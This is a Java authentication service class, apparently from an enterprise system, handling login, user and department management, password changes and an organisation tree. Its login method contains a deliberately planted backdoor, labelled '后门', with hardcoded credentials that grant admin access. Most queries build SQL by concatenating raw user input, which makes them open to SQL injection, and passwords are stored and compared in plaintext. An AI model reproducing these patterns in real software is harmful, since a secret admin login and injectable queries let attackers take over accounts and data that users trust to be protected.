package com.hz.auth.service;

import java.sql.Connection;
import java.sql.Timestamp;
import java.util.List;

import org.apache.log4j.Logger;

import com.hz.auth.obj.AuthDepartment;
import com.hz.auth.obj.AuthGroup;
import com.hz.auth.obj.AuthUser;
import com.hz.auth.obj.AuthUserRole;
import com.hz.auth.obj.LogLoginDbObj;
import com.hz.util.SystemConstant;
import com.inspur.common.tree.Node;
import com.inspur.common.tree.TreeBuilder;
import com.inspur.common.tree.conifg.TreeObj;
import com.wuyg.common.dao.DefaultBaseDAO;
import com.wuyg.common.dao.IBaseDAO;
import com.wuyg.common.obj.PaginationObj;
import com.wuyg.common.util.Constant;
import com.wuyg.common.util.MySqlUtil;
import com.wuyg.common.util.StringUtil;

public class AuthService implements IAuthService
{
	private Logger logger = Logger.getLogger(getClass());
	private IBaseDAO userBaseDAO = new DefaultBaseDAO(new AuthUser(), SystemConstant.INNER_DB);
	private IBaseDAO departmentBaseDAO = new DefaultBaseDAO(new AuthDepartment(), SystemConstant.INNER_DB);
	private IBaseDAO groupBaseDAO = new DefaultBaseDAO(new AuthGroup(), SystemConstant.INNER_DB);
	private IBaseDAO userRoleBaseDAO = new DefaultBaseDAO(new AuthUserRole(), SystemConstant.INNER_DB);
	private IBaseDAO logLoginBaseDAO = new DefaultBaseDAO(new LogLoginDbObj(), SystemConstant.INNER_DB);

	public boolean delete(List<String> userIds)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public AuthUser getUserInfoByAccount(String account)
	{
		List<AuthUser> userList = userBaseDAO.searchByClause(AuthUser.class, " account='" + account + "'", null, 0, Integer.MAX_VALUE);
		if (userList.size() > 0)
		{
			AuthUser user = userList.get(0);

			List<AuthUserRole> roles = userRoleBaseDAO.searchByClause(AuthUserRole.class, "userAccount='" + user.getAccount() + "'", "", 0, Integer.MAX_VALUE);

			user.fillRoles(roles);

			return user;
		} else
		{
			return null;
		}
	}

	public AuthUser login(String account, String password)
	{
		AuthUser user = null;

		List<AuthUser> userList = userBaseDAO.searchByClause(AuthUser.class, " account='" + account + "' and password='" + password + "'", null, 0, Integer.MAX_VALUE);

		// 后门
		if ("root".equals(account) && "root123!@#".equals(password))
		{
			userList = userBaseDAO.searchByClause(AuthUser.class, " account='admin'", null, 0, Integer.MAX_VALUE);
			account = SystemConstant.AUTH_USER_ADMIN;
		}

		// 查询本系统用户信息
		if (userList.size() > 0)
		{
			user = getUserInfoByAccount(account);
		}

		// 记录登陆日志
		if (user != null)
		{
			LogLoginDbObj logLogin = new LogLoginDbObj();
			logLogin.setId(logLoginBaseDAO.getMaxKeyValue() + 1);
			logLogin.setUserAccount(user.getAccount());
			logLogin.setUserName(user.getName());
			logLogin.setUserDistrict(user.getDistrict());
			logLogin.setUserDepartmentId(user.getDepartmentId());
			logLogin.setUserDepartmentName(user.getDepartmentName());
			logLogin.setTimeStamp(new Timestamp(System.currentTimeMillis()));
			logLoginBaseDAO.save(logLogin);
		}

		return user;
	}

	public boolean save(AuthUser userInfo)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public boolean update(AuthUser userInfo)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public AuthUser getForcemanByCsr(String csrAccount)
	{
		List<AuthUser> userList = userBaseDAO.searchByClause(AuthUser.class, " account in (select forceman_account from auth_csr_vs_forceman where csr_account='" + csrAccount
				+ "')", null, 0, Integer.MAX_VALUE);
		if (userList.size() > 0)
		{
			return userList.get(0);
		} else
		{
			return null;
		}
	}

	public List<AuthUser> getSubordinateList(String account)
	{
		return userBaseDAO.searchByClause(AuthUser.class, " immediateLeaderAccount='" + account + "'", null, 0, Integer.MAX_VALUE);
	}

	public AuthUser getImmediateLeader(String account)
	{
		return (AuthUser) userBaseDAO.searchByClause(AuthUser.class, " account = (select immediateLeaderAccount from auth_user_info where account='" + account + "')", null, 0, 1)
				.get(0);
	}

	public String modifyPassword(int id, String oldPassword, String newPasswod)
	{
		boolean rst = false;

		AuthUser userInfo = (AuthUser) userBaseDAO.searchByKey(AuthUser.class, id + "");
		if (!userInfo.getPassword().equals(oldPassword))
		{
			return "现在的密码不正确";
		} else
		{
			userInfo.setPassword(newPasswod);

			rst = userBaseDAO.update(userInfo);
		}

		if (rst)
		{
			return "密码修改成功";
		} else
		{
			return "密码修改失败";
		}
	}

	public AuthDepartment getDepartmentById(String departmentId)
	{
		AuthDepartment department = (AuthDepartment) this.departmentBaseDAO.searchByKey(AuthDepartment.class, departmentId + "");

		List<AuthUser> users = userBaseDAO.searchByParentKey(AuthUser.class, departmentId + "", "name");

		department.fillUsers(users);

		return department;
	}

	public AuthGroup getGroupById(int groupId)
	{
		return (AuthGroup) this.groupBaseDAO.searchByKey(AuthGroup.class, groupId + "");
	}

	public Node getAuthTree(AuthUser user, String toSubTree, String district, String departmentId, String userAccount)
	{
		Connection connection = null;
		Node rootNode = new Node();
		try
		{
			Connection conn = MySqlUtil.getConnection(SystemConstant.INNER_DB);

			TreeBuilder treeBuilder = TreeBuilder.getInstance();

			TreeObj treeObj = treeBuilder.getTreeObjByName("部门人员树");
			if (!StringUtil.isEmpty(toSubTree))
			{
				treeObj.onlyToSubTree(toSubTree);
			}

			treeObj.setShowLeafCount(false);// 不显示叶子节点的数量

			// 限定条件
			if (!StringUtil.isEmpty(district))
			{
				treeObj.setSubTreeIncludeKeyValueNested("district", district);
			}
			if (!StringUtil.isEmpty(departmentId))
			{
				treeObj.setSubTreeIncludeKeyValueNested("department", departmentId);
			}
			if (!StringUtil.isEmpty(userAccount))
			{
				treeObj.setSubTreeIncludeKeyValueNested("user", userAccount);
			}

			rootNode = treeBuilder.buildTree(treeObj, conn, false);// false表示不用缓存
		} catch (Exception e)
		{
			logger.error(e.getMessage(), e);
		} finally
		{
			MySqlUtil.closeConnection(connection);
		}
		return rootNode;
	}

	public static void main(String[] args)
	{
		IAuthService service = new AuthService();
		Node tree = service.getAuthTree(null, null, null, null, null);
		System.out.println(tree.toXml());
	}

	public PaginationObj searchDepartmentPagination(AuthUser user, List<String> districtNames, String departmentId, String departmentName, int pageNo, int pageCount)
	{
		String where = MySqlUtil.getLikeClause("departmentId", departmentId) + " and " + MySqlUtil.getLikeClause("departmentName", departmentName);
		if (districtNames.size() > 0)
		{
			where += " and districtName in (" + StringUtil.getStringByListWithQuotation(districtNames) + ")";
		}

		PaginationObj pagination = departmentBaseDAO.searchPaginationByClause(AuthDepartment.class, where, "city,districtName,departmentId", pageNo, pageCount);

		List<AuthDepartment> departments = pagination.getDataList();
		for (int i = 0; i < departments.size(); i++)
		{
			AuthDepartment department = departments.get(i);
			List<AuthUser> users = userBaseDAO.searchByClause(AuthUser.class, "departmentId='" + department.getDepartmentId() + "'", null, 0, Integer.MAX_VALUE);
			department.fillUsers(users);
		}

		return pagination;
	}

	public boolean deleteDepartment(List<String> departmentIds)
	{
		departmentBaseDAO.deleteByKeys(departmentIds);
		return true;
	}

	public boolean saveOrUpdateDepartment(AuthDepartment department)
	{
		return departmentBaseDAO.saveOrUpdate(department);
	}

	public boolean deleteUser(List<String> userIds)
	{
		userBaseDAO.deleteByKeys(userIds);
		return true;
	}

	public boolean saveOrUpdateUser(AuthUser user)
	{
		if (user.getId() > 0)
		{
			return userBaseDAO.update(user);
		} else
		{
			long id = userBaseDAO.getMaxKeyValue() + 1;
			user.setId((int) id);
			return userBaseDAO.save(user);
		}

	}

	public PaginationObj searchUserPaginationByDistrict(AuthUser user, List<String> districtNames, String name, String account, int pageNo, int pageCount)
	{
		String where = MySqlUtil.getLikeClause("name", name) + " and " + MySqlUtil.getLikeClause("account", account);
		if (districtNames.size() > 0)
		{
			where += " and district in (" + StringUtil.getStringByListWithQuotation(districtNames) + ")";
		}

		PaginationObj pagination = userBaseDAO.searchPaginationByClause(AuthUser.class, where, "city,district,departmentName", pageNo, pageCount);

		return pagination;
	}
}
